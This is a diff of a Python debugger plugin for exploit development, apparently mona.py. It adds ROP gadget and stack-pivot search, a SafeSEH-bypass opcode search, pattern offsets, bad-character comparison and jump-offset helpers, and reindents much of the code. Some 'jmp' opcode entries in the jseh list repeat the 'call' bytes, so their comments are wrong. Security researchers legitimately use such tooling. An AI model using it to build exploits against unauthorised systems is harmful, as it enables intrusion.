-            fast = False
-            endingstr = ""
-            endings = []
-            
-            if "depth" in args:
-                if type(args["depth"]).__name__.lower() != "bool":
-                    try:
-                        depth = int(args["depth"])
-                    except:
-                        pass
-            
-            if "offset" in args:
-                if type(args["offset"]).__name__.lower() != "bool":
-                    try:
-                        maxoffset = int(args["offset"])
-                    except:
-                        pass
-            
-            if "distance" in args:
-                if type(args["distance"]).__name__.lower() != "bool":
-                    try:
-                        thedistance = args["distance"]
-                    except:
-                        pass
-            
-            if "split" in args:
-                if type(args["split"]).__name__.lower() == "bool":
-                    split = args["split"]
-                    
-            if "fast" in args:
-                if type(args["fast"]).__name__.lower() == "bool":
-                    fast = args["fast"]
-            
-            if "end" in args:
-                if type(args["end"]).__name__.lower() == "str":
-                    endingstr = args["end"].replace("'","").replace('"',"").strip()
-                    endings = endingstr.split("#")
-                    
-            if "f" in args:
-                if args["f"] <> "":
-                    criteria["f"] = args["f"]
-            
-            
-            if "rva" in args:
-                criteria["rva"] = True
-            
-            if mode == "stackpivot":
-                fast = False
-                endings = ""
-                split = False
-            else:
-                mode = "all"
-            
-            findROPGADGETS(modulecriteria,criteria,endings,maxoffset,depth,split,thedistance,fast,mode)
-            
-            
-            
-        def procJOP(args,mode="all"):
-            #default criteria
-            modulecriteria={}
-            modulecriteria["aslr"] = False
-            modulecriteria["rebase"] = False
-            modulecriteria["os"] = False
+			criteria={}
+			
+			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
+			
+			# handle optional arguments
+			
+			depth = 6
+			maxoffset = 40
+			thedistance = 8
+			split = False
+			fast = False
+			sortedprint = False
+			endingstr = ""
+			endings = []
+			technique = ""            
+			
+			if "depth" in args:
+				if type(args["depth"]).__name__.lower() != "bool":
+					try:
+						depth = int(args["depth"])
+					except:
+						pass
+			
+			if "offset" in args:
+				if type(args["offset"]).__name__.lower() != "bool":
+					try:
+						maxoffset = int(args["offset"])
+					except:
+						pass
+			
+			if "distance" in args:
+				if type(args["distance"]).__name__.lower() != "bool":
+					try:
+						thedistance = args["distance"]
+					except:
+						pass
+			
+			if "split" in args:
+				if type(args["split"]).__name__.lower() == "bool":
+					split = args["split"]
+
+			if "s" in args:
+				if type(args["s"]).__name__.lower() != "bool":
+					technique = args["s"].replace("'","").replace('"',"").strip().lower()                   
+					
+			if "fast" in args:
+				if type(args["fast"]).__name__.lower() == "bool":
+					fast = args["fast"]
+			
+			if "end" in args:
+				if type(args["end"]).__name__.lower() == "str":
+					endingstr = args["end"].replace("'","").replace('"',"").strip()
+					endings = endingstr.split("#")
+					
+			if "f" in args:
+				if args["f"] != "":
+					criteria["f"] = args["f"]
+			
+			if "sort" in args:
+				sortedprint = True
+			
+			if "rva" in args:
+				criteria["rva"] = True
+			
+			if mode == "stackpivot":
+				fast = False
+				endings = ""
+				split = False
+			else:
+				mode = "all"
+			
+			findROPGADGETS(modulecriteria,criteria,endings,maxoffset,depth,split,thedistance,fast,mode,sortedprint,technique)
+			
+
+		def procJseh(args):
+			results = []
+			showred=0
+			showall=False
+			if "all" in args:
+				showall = True
+			nrfound = 0
+			dbg.log("-----------------------------------------------------------------------")
+			dbg.log("Search for jmp/call dword[ebp/esp+nn] (and other) combinations started ")
+			dbg.log("-----------------------------------------------------------------------")
+			opcodej=["\xff\x54\x24\x08", #call dword ptr [esp+08]
+					"\xff\x64\x24\x08", #jmp dword ptr [esp+08]
+					"\xff\x54\x24\x14", #call dword ptr [esp+14]
+					"\xff\x54\x24\x14", #jmp dword ptr [esp+14]
+					"\xff\x54\x24\x1c", #call dword ptr [esp+1c]
+					"\xff\x54\x24\x1c", #jmp dword ptr [esp+1c]
+					"\xff\x54\x24\x2c", #call dword ptr [esp+2c]
+					"\xff\x54\x24\x2c", #jmp dword ptr [esp+2c]
+					"\xff\x54\x24\x44", #call dword ptr [esp+44]
+					"\xff\x54\x24\x44", #jmp dword ptr [esp+44]
+					"\xff\x54\x24\x50", #call dword ptr [esp+50]
+					"\xff\x54\x24\x50", #jmp dword ptr [esp+50]
+					"\xff\x55\x0c",     #call dword ptr [ebp+0c]
+					"\xff\x65\x0c",     #jmp dword ptr [ebp+0c]
+					"\xff\x55\x24",     #call dword ptr [ebp+24]
+					"\xff\x65\x24",     #jmp dword ptr [ebp+24]
+					"\xff\x55\x30",     #call dword ptr [ebp+30]
+					"\xff\x65\x30",     #jmp dword ptr [ebp+30]
+					"\xff\x55\xfc",     #call dword ptr [ebp-04]
+					"\xff\x65\xfc",     #jmp dword ptr [ebp-04]
+					"\xff\x55\xf4",     #call dword ptr [ebp-0c]
+					"\xff\x65\xf4",     #jmp dword ptr [ebp-0c]
+					"\xff\x55\xe8",     #call dword ptr [ebp-18]
+					"\xff\x65\xe8",     #jmp dword ptr [ebp-18]
+					"\x83\xc4\x08\xc3", #add esp,8 + ret
+					"\x83\xc4\x08\xc2"] #add esp,8 + ret X
+			fakeptrcriteria = {}
+			fakeptrcriteria["accesslevel"] = "*"
+			for opjc in opcodej:
+				addys = []
+				addys = searchInRange( [[opjc, opjc]], 0, TOP_USERLAND, fakeptrcriteria)
+				results += addys
+				for ptrtypes in addys:
+					for ad1 in addys[ptrtypes]:
+						ptr = MnPointer(ad1)
+						module = ptr.belongsTo()
+						if not module:
+							module=""
+							page   = dbg.getMemoryPageByAddress( ad1 )
+							access = page.getAccess( human = True )
+							op = dbg.disasm( ad1 )
+							opstring=op.getDisasm()
+							dbg.log("Found %s at 0x%08x - Access: (%s) - Outside of a loaded module" % (opstring, ad1, access), address = ad1,highlight=1)
+							nrfound+=1
+						else:
+							if showall:
+								page   = dbg.getMemoryPageByAddress( ad1 )
+								access = page.getAccess( human = True )
+								op = dbg.disasm( ad1 )
+								opstring=op.getDisasm()
+								thismod = MnModule(module)
+								if not thismod.isSafeSEH:
+								#if ismodulenosafeseh(module[0])==1:
+									extratext="=== Safeseh : NO ==="
+									showred=1
+								else:
+									extratext="Safeseh protected"
+									showred=0
+								dbg.log("Found %s at 0x%08x (%s) - Access: (%s) - %s" % (opstring, ad1, module,access,extratext), address = ad1,highlight=showred)
+								nrfound+=1
+			dbg.log("Search complete")
+			if results:
+				dbg.log("Found %d address(es)" % nrfound)
+				return "Found %d address(es) (Check the log Windows for details)" % nrfound
+			else:
+				dbg.log("No addresses found")
+				return "Sorry, no addresses found"
+
+			
+		def procJOP(args,mode="all"):
+			#default criteria
+			modulecriteria={}
+			modulecriteria["aslr"] = False
+			modulecriteria["rebase"] = False
+			modulecriteria["os"] = False
 
             criteria={}
             
@@ -11640,75 +12344,75 @@ def main(args):
             return
 
 
-        def procOffsetPATTERN(args):
-            egg = ""
-            if "?" in args and args["?"] != "":
-                try:
-                    egg = args["?"]
-                except:
-                    egg = ""
-            if egg == "":
-                dbg.log("Please enter a valid target",highlight=1)
-            else:
-                findOffsetInPattern(egg,-1,args)
-            return
-        
-        # ----- Comparing file output ----- #
-        def procFileCOMPARE(args):
-            modulecriteria={}
-            criteria={}
-            modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
-            allfiles=[]
-            tomatch=""
-            checkstrict=True
-            rangeval = 0
-            fast = False
-            if "ptronly" in args or "ptrsonly" in args:
-                fast = True
-            if "f" in args:
-                if args["f"] <> "":
-                    rawfilenames=args["f"].replace('"',"")
-                    allfiles = rawfilenames.split(',')
-                    dbg.log("[+] Number of files to be examined : %d " % len(allfiles))
-            if "range" in args:
-                if not type(args["range"]).__name__.lower() == "bool":
-                    strrange = args["range"].lower()
-                    if strrange.startswith("0x") and len(strrange) > 2 :
-                        rangeval = int(strrange,16)
-                    else:
-                        try:
-                            rangeval = int(args["range"])
-                        except:
-                            rangeval = 0
-                    if rangeval > 0:
-                        dbg.log("[+] Find overlap using pointer +/- range, value %d" % rangeval)
-                        dbg.log("    Note : this will significantly slow down the comparison process !")
-                else:
-                    dbg.log("Please provide a numeric value ^(> 0) with option -range",highlight=1)
-                    return
-            else:
-                if "contains" in args:
-                    if type(args["contains"]).__name__.lower() == "str":
-                        tomatch = args["contains"].replace("'","").replace('"',"")
-                if "nostrict" in args:
-                    if type(args["nostrict"]).__name__.lower() == "bool":
-                        checkstrict = not args["nostrict"]
-                        dbg.log("[+] Instructions must match in all files ? %s" % checkstrict)
-            # maybe one of the arguments is a folder
-            callfiles = allfiles
-            allfiles = []
-            for tfile in callfiles:
-                if os.path.isdir(tfile):
-                    # folder, get all files from this folder
-                    for root,dirs,files in os.walk(tfile):
-                        for dfile in files:
-                            allfiles.append(os.path.join(root,dfile))
-                else:
-                    allfiles.append(tfile)
-            if len(allfiles) > 1:
-                findFILECOMPARISON(modulecriteria,criteria,allfiles,tomatch,checkstrict,rangeval,fast)
-            else:
-                dbg.log("Please specify at least 2 filenames to compare",highlight=1)
+		def procOffsetPATTERN(args):
+			egg = ""
+			if "?" in args and args["?"] != "":
+				try:
+					egg = args["?"]
+				except:
+					egg = ""
+			if egg == "":
+				dbg.log("Please enter a valid target",highlight=1)
+			else:
+				findOffsetInPattern(egg,-1,args)
+			return
+		
+		# ----- Comparing file output ----- #
+		def procFileCOMPARE(args):
+			modulecriteria={}
+			criteria={}
+			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
+			allfiles=[]
+			tomatch=""
+			checkstrict=True
+			rangeval = 0
+			fast = False
+			if "ptronly" in args or "ptrsonly" in args:
+				fast = True
+			if "f" in args:
+				if args["f"] != "":
+					rawfilenames=args["f"].replace('"',"")
+					allfiles = [getAbsolutePath(f) for f in rawfilenames.split(',')]
+					dbg.log("[+] Number of files to be examined : %d " % len(allfiles))
+			if "range" in args:
+				if not type(args["range"]).__name__.lower() == "bool":
+					strrange = args["range"].lower()
+					if strrange.startswith("0x") and len(strrange) > 2 :
+						rangeval = int(strrange,16)
+					else:
+						try:
+							rangeval = int(args["range"])
+						except:
+							rangeval = 0
+					if rangeval > 0:
+						dbg.log("[+] Find overlap using pointer +/- range, value %d" % rangeval)
+						dbg.log("    Note : this will significantly slow down the comparison process !")
+				else:
+					dbg.log("Please provide a numeric value ^(> 0) with option -range",highlight=1)
+					return
+			else:
+				if "contains" in args:
+					if type(args["contains"]).__name__.lower() == "str":
+						tomatch = args["contains"].replace("'","").replace('"',"")
+				if "nostrict" in args:
+					if type(args["nostrict"]).__name__.lower() == "bool":
+						checkstrict = not args["nostrict"]
+						dbg.log("[+] Instructions must match in all files ? %s" % checkstrict)
+			# maybe one of the arguments is a folder
+			callfiles = allfiles
+			allfiles = []
+			for tfile in callfiles:
+				if os.path.isdir(tfile):
+					# folder, get all files from this folder
+					for root,dirs,files in os.walk(tfile):
+						for dfile in files:
+							allfiles.append(os.path.join(root,dfile))
+				else:
+					allfiles.append(tfile)
+			if len(allfiles) > 1:
+				findFILECOMPARISON(modulecriteria,criteria,allfiles,tomatch,checkstrict,rangeval,fast)
+			else:
+				dbg.log("Please specify at least 2 filenames to compare",highlight=1)
 
         # ----- Find bytes in memory ----- #
         def procFind(args):
@@ -11888,5958 +12592,6056 @@ def main(args):
                     dbg.log("invalid depth value",highlight=1)
                     return  
 
-            if "all" in args:
-                criteria["all"] = True
-                
-            if "distance" in args:
-                if type(args["distance"]).__name__.lower() == "bool":
-                    dbg.log("invalid distance value(s)",highlight=1)
-                else:
-                    distancestr = args["distance"]
-                    distanceparts = distancestr.split(",")
-                    for parts in distanceparts:
-                        valueparts = parts.split("=")
-                        if len(valueparts) > 1:
-                            if valueparts[0].lower() == "min":
-                                try:
-                                    mindistance = int(valueparts[1])
-                                except:
-                                    mindistance = 0 
-                            if valueparts[0].lower() == "max":
-                                try:
-                                    maxdistance = int(valueparts[1])
-                                except:
-                                    maxdistance = 0 
-            
-                if maxdistance < mindistance:
-                    tmp = maxdistance
-                    maxdistance = mindistance
-                    mindistance = tmp
-                
-                criteria["mindistance"] = mindistance
-                criteria["maxdistance"] = maxdistance
+			if "all" in args:
+				criteria["all"] = True
+				
+			if "distance" in args:
+				if type(args["distance"]).__name__.lower() == "bool":
+					dbg.log("invalid distance value(s)",highlight=1)
+				else:
+					distancestr = args["distance"]
+					distanceparts = distancestr.split(",")
+					for parts in distanceparts:
+						valueparts = parts.split("=")
+						if len(valueparts) > 1:
+							if valueparts[0].lower() == "min":
+								try:
+									mindistance = int(valueparts[1])
+								except:
+									mindistance = 0	
+							if valueparts[0].lower() == "max":
+								try:
+									maxdistance = int(valueparts[1])
+								except:
+									maxdistance = 0	
+			
+				if maxdistance < mindistance:
+					tmp = maxdistance
+					maxdistance = mindistance
+					mindistance = tmp
+				
+				criteria["mindistance"] = mindistance
+				criteria["maxdistance"] = maxdistance
+						
+			allpointers = findPatternWild(modulecriteria,criteria,pattern,base,top,patterntype)
+				
+			logfile = MnLog("findwild.txt")
+			thislog = logfile.reset()
+			processResults(allpointers,logfile,thislog)		
+			return
+	
+			
+		# ----- assemble: assemble instructions to opcodes ----- #
+		def procAssemble(args):
+			opcodes = ""
+			encoder = ""
+			
+			if not 's' in args:
+				dbg.log("Mandatory argument -s <opcodes> missing", highlight=1)
+				return
+			opcodes = args['s']
+			
+			if 'e' in args:
+				# TODO: implement encoder support
+				dbg.log("Encoder support not yet implemented", highlight=1)
+				return
+				encoder = args['e'].lowercase()
+				if encoder not in ["ascii"]:
+					dbg.log("Invalid encoder : %s" % encoder, highlight=1)
+					return
+			
+			assemble(opcodes,encoder)
+			
+		# ----- info: show information about an address ----- #
+		def procInfo(args):
+			if not "a" in args:
+				dbg.log("Missing mandatory argument -a", highlight=1)
+				return
+			
+			address,addyok = getAddyArg(args["a"])
+			if not addyok:
+				dbg.log("%s is an invalid address" % args["a"], highlight=1)
+				return
+			
+			ptr = MnPointer(address)
+			modname = ptr.belongsTo()
+			modinfo = None
+			if modname != "":
+				modinfo = MnModule(modname)
+			rebase = ""
+			rva=0
+			if modinfo :
+				rva = address - modinfo.moduleBase
+			procFlags(args)
+			dbg.log("")			
+			dbg.log("[+] Information about address 0x%s" % toHex(address))
+			dbg.log("    %s" % ptr.__str__())
+			thepage = dbg.getMemoryPageByAddress(address)
+			dbg.log("    Address is part of page 0x%08x - 0x%08x" % (thepage.getBaseAddress(),thepage.getBaseAddress()+thepage.getSize()))
+			section = ""
+			try:
+				section = thepage.getSection()
+			except:
+				section = ""
+			if section != "":
+				dbg.log("    Section : %s" % section)
+			
+			if ptr.isOnStack():
+				stacks = getStacks()
+				stackref = ""
+				for tid in stacks:
+					currstack = stacks[tid]
+					if currstack[0] <= address and address <= currstack[1]:
+						stackref = " (Thread 0x%08x, Stack Base : 0x%08x, Stack Top : 0x%08x)" % (tid,currstack[0],currstack[1])
+						break
+				dbg.log("    This address is in a stack segment %s" % stackref)
+			if modinfo:
+				dbg.log("    Address is part of a module:")
+				dbg.log("    %s" % modinfo.__str__())
+				if rva != 0:
+					dbg.log("    Offset from module base: 0x%x" % rva)
+					if modinfo:
+						eatlist = modinfo.getEAT()
+						if address in eatlist:
+							dbg.log("    Address is start of function '%s' in %s" % (eatlist[address],modname))
+						else:
+							iatlist = modinfo.getIAT()
+							if address in iatlist:
+								iatentry = iatlist[address]
+								dbg.log("    Address is part of IAT, and contains pointer to '%s'" % iatentry)				
+			else:
+				output = ""
+				if ptr.isInHeap():
+					dbg.log("    This address resides in the heap")
+					dbg.log("")
+					ptr.showHeapBlockInfo()
+				else:
+					dbg.log("    Module: None")					
+			try:
+				dbg.log("")
+				dbg.log("[+] Disassembly:")
+				op = dbg.disasm(address)
+				opstring=getDisasmInstruction(op)
+				dbg.log("    Instruction at %s : %s" % (toHex(address),opstring))
+			except:
+				pass
+			if __DEBUGGERAPP__ == "WinDBG":
+				dbg.log("")
+				dbg.log("Output of !address 0x%08x:" % address)
+				output = dbg.nativeCommand("!address 0x%08x" % address)
+				dbg.logLines(output)
+			dbg.log("")
+		
+		# ----- dump: Dump some memory to a file ----- #
+		def procDump(args):
+			
+			filename = ""
+			if "f" not in args:
+				dbg.log("Missing mandatory argument -f filename", highlight=1)
+				return
+			filename = args["f"]
+			
+			address = None
+			if "s" not in args:
+				dbg.log("Missing mandatory argument -s address", highlight=1)
+				return
+			startaddress = str(args["s"]).replace("0x","").replace("0X","")
+			if not isAddress(startaddress):
+				dbg.log("You have specified an invalid start address", highlight=1)
+				return
+			address = addrToInt(startaddress)
+			
+			size = 0
+			if "n" in args:
+				size = int(args["n"])
+			elif "e" in args:
+				endaddress = str(args["e"]).replace("0x","").replace("0X","")
+				if not isAddress(endaddress):
+					dbg.log("You have specified an invalid end address", highlight=1)
+					return
+				end = addrToInt(endaddress)
+				if end < address:
+					dbg.log("end address %s is before start address %s" % (args["e"],args["s"]), highlight=1)
+					return
+				size = end - address
+			else:
+				dbg.log("you need to specify either the size of the copy with -n or the end address with -e ", highlight=1)
+				return
+			
+			dumpMemoryToFile(address,size,filename)
+
+		# ----- compare : Compare a file created by msfvenom/gdb/hex/xxd/hexdump/ollydbg or just a file with raw bytes with a copy in memory, indicate bad chars / corruption ----- #
+		def procCompare(args):
+			startpos = 0
+			filename = ""
+			skipmodules = False
+			findunicode = False
+			allregs = dbg.getRegs()
+			if "f" in args:
+				filename = getAbsolutePath(args["f"].replace('"',"").replace("'",""))
+				#see if we can read the file
+				if not os.path.isfile(filename):
+					dbg.log("Unable to find/read file %s" % filename,highlight=1)
+					return
+			else:
+				dbg.log("You must specify a valid filename using parameter -f", highlight=1)
+				return
+			if "a" in args:
+				startpos,addyok = getAddyArg(args["a"])
+				if not addyok:
+					dbg.log("%s is an invalid address" % args["a"], highlight=1)
+					return
+			if "s" in args:
+				skipmodules = True
+			if "unicode" in args:
+				findunicode = True
+			if "t" in args:
+				format = args["t"]
+			else:
+				format = None
+			compareFormattedFileWithMemory(filename,format,startpos,skipmodules,findunicode)				
+			
+		# ----- offset: Calculate the offset between two addresses ----- #
+		def procOffset(args):
+			extratext1 = ""
+			extratext2 = ""
+			isReg_a1 = False
+			isReg_a2 = False
+			regs = dbg.getRegs()
+			if "a1" not in args:
+				dbg.log("Missing mandatory argument -a1 <address>", highlight=1)
+				return
+			a1 = args["a1"]
+			if "a2" not in args:
+				dbg.log("Missing mandatory argument -a2 <address>", highlight=1)
+				return		
+			a2 = args["a2"]
+
+
+			a1,addyok = getAddyArg(args["a1"])
+			if not addyok:			
+				dbg.log("0x%08x is not a valid address" % a1, highlight=1)
+				return
+
+			a2,addyok = getAddyArg(args["a2"])
+			if not addyok:			
+				dbg.log("0x%08x is not a valid address" % a2, highlight=1)
+				return
+
+			diff = a2 - a1
+			result=toHex(diff)
+			negjmpbytes = ""
+			if a1 > a2:
+				ndiff = a1 - a2
+				result=toHex(4294967296-ndiff) 
+				negjmpbytes="\\x"+ result[6]+result[7]+"\\x"+result[4]+result[5]+"\\x"+result[2]+result[3]+"\\x"+result[0]+result[1]
+				regaction="sub"
+			dbg.log("Offset from 0x%08x to 0x%08x : %d (0x%s) bytes" % (a1,a2,diff,result))	
+			if a1 > a2:
+				dbg.log("Negative jmp offset : %s" % negjmpbytes)
+			else:
+				dbg.log("Jmp offset : %s" % negjmpbytes)		
+			return		
+				
+		# ----- bp: Set a breakpoint on read/write/exe access ----- #
+		def procBp(args):
+			isReg_a = False
+			regs = dbg.getRegs()
+			thistype = ""
+			
+			if "a" not in args:
+				dbg.log("Missing mandatory argument -a address", highlight=1)
+				dbg.log("The address can be an absolute address, a register, or a modulename!functionname")
+				return
+			a = str(args["a"])
+
+			for reg in regs:
+				if reg.upper() == a.upper():
+					a=toHex(regs[reg])					
+					isReg_a = True
+					break
+			a = a.upper().replace("0X","").lower()
+			
+			if not isAddress(str(a)):
+				# maybe it's a modulename!function
+				if str(a).find("!") > -1:
+					modparts = str(a).split("!")
+					modname = modparts[0]
+					if not modname.lower().endswith(".dll"):
+						modname += ".dll" 
+					themodule = MnModule(modname)											
+					if themodule != None and len(modparts) > 1:
+						eatlist = themodule.getEAT()
+						funcname = modparts[1].lower()
+						addyfound = False
+						for eatentry in eatlist:
+							if eatlist[eatentry].lower() == funcname:
+								a = "%08x" % (eatentry)
+								addyfound = True
+								break
+						if not addyfound:
+							# maybe it's just a symbol, try to resolve
+							if __DEBUGGERAPP__ == "WinDBG":
+								symboladdress = dbg.resolveSymbol(a)
+								if symboladdress != "" :
+									a = symboladdress
+									addyfound = True
+						if not addyfound:
+							dbg.log("Please specify a valid address/register/modulename!functionname (-a)", highlight=1)
+							return								
+					else:
+						dbg.log("Please specify a valid address/register/modulename!functionname (-a)", highlight=1)
+						return						
+				else:
+					dbg.log("Please specify a valid address/register/modulename!functionname (-a)", highlight=1)
+					return
+			
+			valid_types = ["READ", "WRITE", "SFX", "EXEC"]
+
+			if "t" not in args:
+				dbg.log("Missing mandatory argument -t type", highlight=1)
+				dbg.log("Valid types are: %s" % ", ".join(valid_types))
+				return
+			else:
+				thistype = args["t"].upper()
+				
+			
+			if not thistype in valid_types:
+				dbg.log("Invalid type : %s" % thistype)
+				return
+			
+			if thistype == "EXEC":
+				thistype = "SFX"
+			
+			a = hexStrToInt(a)
+			
+			dbg.setMemBreakpoint(a,thistype[0])
+			dbg.log("Breakpoint set on %s of 0x%s" % (thistype,toHex(a)),highlight=1)
+
+
+		# ----- ct: calltrace ---- #
+		def procCallTrace(args):
+			modulecriteria={}
+			criteria={}
+			criteria["accesslevel"] = "X"
+			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
+			modulestosearch = getModulesToQuery(modulecriteria)
+			hooks = []
+			rethooks = []
+			showargs = 0
+			hookrets = False
+			if not "m" in args:
+				dbg.log(" ** Please specify what module(s) you want to include in the trace, using argument -m **",highlight=1)
+				return
+			if "a" in args:
+				if args["a"] != "":
+					try:
+						showargs = int(args["a"])
+					except:
+						showargs = 0
+						
+			if "r" in args:
+				hookrets = True
+			toignore = []
+			limit_scope = True
+			if not "all" in args:
+				# fill up array
+				toignore.append("PeekMessage")
+				toignore.append("GetParent")
+				toignore.append("GetFocus")
+				toignore.append("EnterCritical")
+				toignore.append("LeaveCritical")
+				toignore.append("GetWindow")
+				toignore.append("CallnextHook")
+				toignore.append("TlsGetValue")
+				toignore.append("DefWindowProc")
+				toignore.append("SetTextColor")
+				toignore.append("DrawText")
+				toignore.append("TranslateAccel")
+				toignore.append("TranslateMessage")
+				toignore.append("DispatchMessage")
+				toignore.append("isChild")
+				toignore.append("GetSysColor")
+				toignore.append("SetBkColor")
+				toignore.append("GetDlgCtrl")
+				toignore.append("CallWindowProc")
+				toignore.append("HideCaret")
+				toignore.append("MessageBeep")
+				toignore.append("SetWindowText")
+				toignore.append("GetDlgItem")
+				toignore.append("SetFocus")
+				toignore.append("SetCursor")
+				toignore.append("LoadCursor")
+				toignore.append("SetEvent")
+				toignore.append("SetDlgItem")
+				toignore.append("SetWindowPos")
+				toignore.append("GetDC")
+				toignore.append("ReleaseDC")
+				toignore.append("GetDeviceCaps")
+				toignore.append("GetClientRect")
+				toignore.append("etLastError")
+			else:
+				limit_scope = False
+			if len( modulestosearch) > 0:
+				dbg.log("[+] Initializing log file")
+				logfile = MnLog("calltrace.txt")
+				thislog = logfile.reset()			
+				dbg.log("[+] Number of CALL arguments to display : %d" % showargs)
+				dbg.log("[+] Finding instructions & placing hooks")
+				for thismod in modulestosearch:
+					dbg.updateLog()
+					objMod = dbg.getModule(thismod)
+					if not objMod.isAnalysed:
+						dbg.log("    Analysing code...")
+						objMod.Analyse()
+					themod = MnModule(thismod)
+					modcodebase = themod.moduleCodebase
+					modcodetop = themod.moduleCodetop		
+					dbg.setStatusBar("Placing hooks in %s..." % thismod)
+					dbg.log("    * %s (0x%08x - 0x%08x)" % (thismod,modcodebase,modcodetop))
+					ccnt = 0
+					rcnt = 0
+					thisaddr = modcodebase
+					allfuncs = dbg.getAllFunctions(modcodebase)
+					for func in allfuncs:
+						thisaddr = func
+						thisfunc = dbg.getFunction(thisaddr)
+						instrcnt = 0
+						while thisfunc.hasAddress(thisaddr):
+							try:
+								if instrcnt == 0:
+									thisopcode = dbg.disasm(thisaddr)
+								else:
+									thisopcode = dbg.disasmForward(thisaddr,1)
+									thisaddr = thisopcode.getAddress()
+								instruction = getDisasmInstruction(thisopcode)
+								if instruction.startswith("CALL "):
+									ignore_this_instruction = False
+									for ignores in toignore:
+										if instruction.lower().find(ignores.lower()) > -1:
+											ignore_this_instruction = True
+											break
+									if not ignore_this_instruction:
+										if not thisaddr in hooks:
+											hooks.append(thisaddr)
+											myhook = MnCallTraceHook(thisaddr,showargs,instruction,thislog)
+											myhook.add("HOOK_CT_%s" % thisaddr , thisaddr)
+									ccnt += 1
+								if hookrets and instruction.startswith("RETN"):
+									if not thisaddr in rethooks:
+										rethooks.append(thisaddr)
+										myhook = MnCallTraceHook(thisaddr,showargs,instruction,thislog)
+										myhook.add("HOOK_CT_%s" % thisaddr , thisaddr)									
+							except:
+								#dbg.logLines(traceback.format_exc(),highlight=True)
+								break
+							instrcnt += 1
+				dbg.log("[+] Total number of CALL hooks placed : %d" % len(hooks))
+				if hookrets:
+					dbg.log("[+] Total number of RETN hooks placed : %d" % len(rethooks))
+			else:
+				dbg.log("[!] No modules selected or found",highlight=1)
+			return "Done"
+			
+		# ----- bu: set a deferred breakpoint ---- #
+		def procBu(args):
+			if not "a" in args:
+				dbg.log("No targets defined. (-a)",highlight=1)
+				return
+			else:
+				allargs = args["a"]
+				bpargs = allargs.split(",")
+				breakpoints = {}
+				dbg.log("")
+				dbg.log("Received %d addresses//functions to process" % len(bpargs))
+				# set a breakpoint right away for addresses and functions that are mapped already
+				for tbparg in bpargs:
+					bparg = tbparg.replace(" ","")
+					# address or module.function ?
+					if bparg.find(".") > -1:
+						functionaddress = dbg.getAddress(bparg)
+						if functionaddress > 0:
+							# module.function is already mapped, we can set a bp right away
+							dbg.setBreakpoint(functionaddress)
+							breakpoints[bparg] = True
+							dbg.log("Breakpoint set at 0x%08x (%s), was already mapped" % (functionaddress,bparg), highlight=1)
+						else:
+							breakpoints[bparg] = False # no breakpoint set yet
+					elif bparg.find("+") > -1:
+						ptrparts = bparg.split("+")
+						modname = ptrparts[0]
+						if not modname.lower().endswith(".dll"):
+							modname += ".dll" 
+						themodule = getModuleObj(modname)												
+						if themodule != None and len(ptrparts) > 1:
+							address = themodule.getBase() + int(ptrparts[1],16)
+							if address > 0:
+								dbg.log("Breakpoint set at %s (0x%08x), was already mapped" % (bparg,address),highlight=1)
+								dbg.setBreakpoint(address)
+								breakpoints[bparg] = True
+							else:
+								breakpoints[bparg] = False
+						else:
+							breakpoints[bparg] = False
+					if bparg.find(".") == -1 and bparg.find("+") == -1:
+						# address, see if it is mapped, by reading one byte from that location
+						address = -1
+						try:
+							address = int(bparg,16)
+						except:
+							pass
+						thispage = dbg.getMemoryPageByAddress(address)
+						if thispage != None:
+							dbg.setBreakpoint(address)
+							dbg.log("Breakpoint set at 0x%08x, was already mapped" % address, highlight=1)
+							breakpoints[bparg] = True
+						else:
+							breakpoints[bparg] = False
+
+				# get the correct addresses to put hook on
+				loadlibraryA = dbg.getAddress("kernel32.LoadLibraryA")
+				loadlibraryW = dbg.getAddress("kernel32.LoadLibraryW")
+
+				if loadlibraryA > 0 and loadlibraryW > 0:
+				
+					# find end of function for each
+					endAfound = False
+					endWfound = False
+					cnt = 1
+					while not endAfound:
+						objInstr = dbg.disasmForward(loadlibraryA, cnt)
+						strInstr = getDisasmInstruction(objInstr)
+						if strInstr.startswith("RETN"):
+							endAfound = True
+							loadlibraryA = objInstr.getAddress()
+						cnt += 1
+					
+					cnt = 1
+					while not endWfound:
+						objInstr = dbg.disasmForward(loadlibraryW, cnt)
+						strInstr = getDisasmInstruction(objInstr)
+						if strInstr.startswith("RETN"):
+							endWfound = True
+							loadlibraryW = objInstr.getAddress()
+						cnt += 1	
+					
+					# if addresses/functions are left, throw them into their own hooks,
+					# one for each LoadLibrary type.
+					hooksplaced = False
+					for bptarget in breakpoints:
+						if not breakpoints[bptarget]:
+							myhookA = MnDeferredHook(loadlibraryA, bptarget)
+							myhookA.add("HOOK_A_%s" % bptarget, loadlibraryA)
+							myhookW = MnDeferredHook(loadlibraryW, bptarget)
+							myhookW.add("HOOK_W_%s" % bptarget, loadlibraryW)
+							dbg.log("Hooks for %s installed" % bptarget)
+							hooksplaced = True
+					if not hooksplaced:
+						dbg.log("No hooks placed")
+				else:
+					dbg.log("** Unable to place hooks, make sure kernel32.dll is loaded",highlight=1)
+				return "Done"							
+			
+		# ----- bf: Set a breakpoint on exported functions of a module ----- #
+		def procBf(args):
+
+			funcfilter = ""
+			
+			mode = ""
+			
+			type = "export"
+			
+			modes = ["add","del","list"]
+			types = ["import","export","iat","eat"]
+			
+			modulecriteria={}
+			criteria={}
+			
+			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
+		
+			if "s" in args:
+				try:
+					funcfilter = args["s"].lower()
+				except:
+					dbg.log("No functions selected. (-s)",highlight=1)
+					return
+			else:
+				dbg.log("No functions selected. (-s)",highlight=1)
+				return
+
+			if "t" in args:
+				try:
+					mode = args["t"].lower()
+				except:
+					pass
+
+			if "f" in args:
+				try:
+					type = args["f"].lower()
+				except:
+					pass
+
+			if not type in types:
+				dbg.log("No valid function type selected (-f <import|export>)",highlight=1)
+				return
+
+			if not mode in modes or mode=="":
+				dbg.log("No valid action defined. (-t add|del|list)")
+
+			doManageBpOnFunc(modulecriteria,criteria,funcfilter,mode,type)
+			
+			return
+		
+		
+		# ----- Show info about modules -------#
+		def procModInfoS(args):
+			modulecriteria = {}
+			criteria = {}
+			modulecriteria["safeseh"] = False
+			dbg.log("Safeseh unprotected modules :")
+			modulestosearch = getModulesToQuery(modulecriteria)
+			showModuleTable("",modulestosearch)
+			return
+			
+		def procModInfoSA(args):
+			modulecriteria = {}
+			criteria = {}
+			modulecriteria["safeseh"] = False
+			modulecriteria["aslr"] = False
